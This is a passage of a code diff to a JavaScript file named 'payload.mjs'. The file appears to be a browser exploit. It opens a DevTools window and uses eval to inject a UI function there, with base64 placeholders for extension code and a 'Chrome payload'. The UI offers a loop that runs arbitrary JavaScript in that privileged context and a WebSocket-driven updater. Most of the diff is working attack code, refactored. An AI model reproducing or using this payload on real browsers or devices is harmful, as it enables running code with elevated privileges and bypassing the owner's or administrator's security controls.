+                             setTimeout(() => { location.reload(); }, 800); // Reload DevTools
+                         } else { alert("Failed to open intermediate window."); window.onunload = previousOnUnload;}
                      }
-                 } catch (e) {
-                     console.error("Error processing WebSocket message:", e);
-                     // Potentially close WS or handle error
-                     // ws.close();
-                 }
+                 } catch (e) { console.error("WS message processing error:", e); }
              };
-
-             ws.onerror = (error) => {
-                 console.error("WebSocket error:", error);
-                 alert("WebSocket connection error. See console.");
-                 window.onunload = previousOnUnload; // Restore unload handler
-             };
-
-             ws.onclose = (event) => {
-                 console.log(`WebSocket closed. Code: ${event.code}, Reason: ${event.reason}`);
-                 // Restore original unload handler if it wasn't already restored on success/error
-                 window.onunload = previousOnUnload;
-             };
+             ws.onerror = (e) => { alert("WebSocket error."); console.error("WS Error:", e); window.onunload = previousOnUnload; };
+             ws.onclose = (e) => { console.log(`WS closed: ${e.code}`); window.onunload = previousOnUnload; };
         } // end handleUpdaterCheck
 
         /** Handles the 'Debug DevTools (Eval)' button */
         function handleDevtoolsDebugEval() {
-            console.warn("Entering potentially dangerous DevTools eval loop. Type 'cancel' in prompt to stop.");
-            let cancelled = false;
-            let evalTimeoutId = null;
-
-            // Define 'cancel' property getter on window to allow stopping loop
-             Object.defineProperty(window, 'cancelEvalLoop', {
-                 get: () => {
-                     console.log("Eval loop cancellation requested.");
-                     cancelled = true;
-                     if (evalTimeoutId) clearTimeout(evalTimeoutId); // Clear any pending timeout
-                     delete window.cancelEvalLoop; // Clean up the property
-                     return "Loop cancelled.";
-                 },
-                 configurable: true // Allow deletion
-             });
-
-            function promptAndEval() {
-                 if (cancelled) return;
-
-                 try {
-                    const code = prompt("Enter JavaScript to evaluate in DevTools context (or type 'cancel' to stop):");
-                    if (code === null || code.toLowerCase() === 'cancel') {
-                       console.log("Eval loop terminated by user prompt.");
-                       if (!cancelled) window.cancelEvalLoop; // Trigger cleanup if not already cancelled
-                       return;
-                     }
-                     if (code.trim() === '') {
-                         console.log("Empty input, prompting again.");
-                         evalTimeoutId = setTimeout(promptAndEval, 0); // Prompt again immediately
-                         return;
-                     }
-
-                     console.log("Evaluating code:", code);
-                     // Use Function constructor for slightly safer eval than direct eval()
-                     const result = new Function(code)();
-                     console.log("Eval result:", result);
-
-                 } catch (e) {
-                    console.error("Error during evaluation:", e);
-                    alert(`Evaluation Error: ${e.message}`);
-                 }
-
-                 // Schedule the next prompt if not cancelled
-                 if (!cancelled) {
-                    evalTimeoutId = setTimeout(promptAndEval, 0); // Continue loop immediately
-                 }
-            }
-            // Start the loop
-            evalTimeoutId = setTimeout(promptAndEval, 0);
+            console.warn("Entering DevTools eval loop. Type 'cancelEvalLoop' property to stop.");
+            let cancelled = false; let evalTimeoutId = null;
+             Object.defineProperty(window, 'cancelEvalLoop', { get:()=>{ console.log("Eval loop cancelled."); cancelled=true; if(evalTimeoutId)clearTimeout(evalTimeoutId); delete window.cancelEvalLoop; return "Loop cancelled."; }, configurable:true });
+             function promptAndEval() {
+                 if(cancelled)return;
+                 try { const code = prompt("Eval in DevTools context ('cancel' to stop):"); if(code===null||code.toLowerCase()==='cancel'){ if(!cancelled)window.cancelEvalLoop; return; } if(code.trim()===''){ evalTimeoutId=setTimeout(promptAndEval,0); return; } console.log("Evaluating:",code); const result = new Function(code)(); console.log("Result:",result); } catch(e){ console.error("Eval error:",e); } if(!cancelled){ evalTimeoutId=setTimeout(promptAndEval,0); }
+             }
+             evalTimeoutId = setTimeout(promptAndEval, 0);
         } // end handleDevtoolsDebugEval
 
         // --- Initialize ---
-        try {
-            setupUI();
-        } catch(e) {
-            console.error("Fatal error setting up DevTools UI:", e);
-            document.body.innerHTML = `<h1 style="color:red">Error</h1><p>Failed to initialize UI.</p><pre>${e.stack}</pre>`;
-        }
+        try { setupUI(); } catch(e) { console.error("Fatal UI setup error:", e); document.body.innerHTML = `<h1 style="color:red">Error</h1><pre>${e.stack}</pre>`; }
 
     } // end devToolsUI function
 
@@ -990,34 +1663,34 @@
     // --- Main Execution Flow ---
 
     async function main() {
-        console.log("Script starting...");
+        console.log("payload.mjs starting...");
         const openerWindow = getOpener();
 
         try {
-            // Open DevTools and wait for API
             const devtoolsWindow = await openDevToolsAndGetAPI(openerWindow);
 
-            // Store devtools window globally if absolutely needed by other scripts?
-            // Avoid if possible.
-             // window.w = devtoolsWindow; // Original code did this
+            // Prepare the devToolsUI function string with placeholders replaced
+            let devToolsUIString = devToolsUI.toString();
+            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_HTML_ENTRY_B64%%', PLACEHOLDER_HTML_ENTRY_B64);
+            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_EXT_JS_B64%%', PLACEHOLDER_EXT_JS_B64);
+            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_EXT_HTML_B64%%', PLACEHOLDER_EXT_HTML_B64);
+            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_CHROME_PAYLOAD_B64%%', PLACEHOLDER_CHROME_PAYLOAD_B64);
+            // Note: %%updaterurl%% placeholder remains within the string for later use by handleUpdaterCheck
 
-            // Inject and execute the UI setup logic within the DevTools window context
             console.log("Executing UI setup in DevTools window context...");
-            // We need to execute devToolsUI in the context of devtoolsWindow
-            devtoolsWindow.eval(`(${devToolsUI.toString()})()`);
+            // Execute the fully formed string in the DevTools window
+            devtoolsWindow.eval(`(${devToolsUIString})()`);
 
             console.log("UI setup initiated in DevTools window. Closing this helper window.");
-            // Close the current window as its job is done
-             window.close();
+            window.close();
 
         } catch (error) {
-            console.error("Critical error:", error);
-            alert(`Failed to initialize DevTools interaction: ${error.message}. Check console for details.`);
-            // Optionally, try to close any windows opened or restore state
+            console.error("Critical error in payload.mjs:", error);
+            alert(`Failed to initialize: ${error.message}`);
         }
     }
 
     // Start the process
     main();
 
-})();
+})()
